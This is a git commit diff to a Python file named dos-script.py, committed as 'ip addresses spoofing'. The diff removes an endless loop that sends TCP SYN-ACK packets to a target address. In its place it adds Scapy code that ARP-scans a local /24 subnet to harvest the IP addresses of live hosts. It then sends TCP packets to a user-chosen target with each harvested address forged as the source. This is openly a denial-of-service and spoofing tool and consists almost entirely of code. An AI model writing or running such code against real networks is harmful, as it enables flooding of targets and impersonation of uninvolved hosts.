8158bca248668f2edffe740a10b1bb2d83bb6423
Nata Chikhinashvili <natanatuka33@gmail.com>
2023-12-12 06:56:58 +0400

    feat: ip addresses spoofing

--- dos-script.py
+++ dos-script.py
@@ -1,8 +1,17 @@
-
-from scapy.all import TCP, IP, sr1
+from scapy.all import TCP, IP, sr1, conf, Ether, ARP, srp
 
 dstaddress = input('Destination address: ')
+flag = input('Flag: ')
 
-while True:
-    p = sr1(IP(dst=dstaddress)/TCP(flags='SA'))
+def getIpAddresses(target_ip):
+    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
+    result = srp(arp_request, timeout=2, iface=None, verbose=False)[0]
+    print(result[1])
+    ipaddresses = [res[1].psrc for res in result]
+    return ipaddresses
+
+ips = getIpAddresses("192.168.1.0/24")
+
+for ip in ips:
+    p = sr1(IP(src=ip, dst=dstaddress)/TCP(flags=flag))
     p.show()
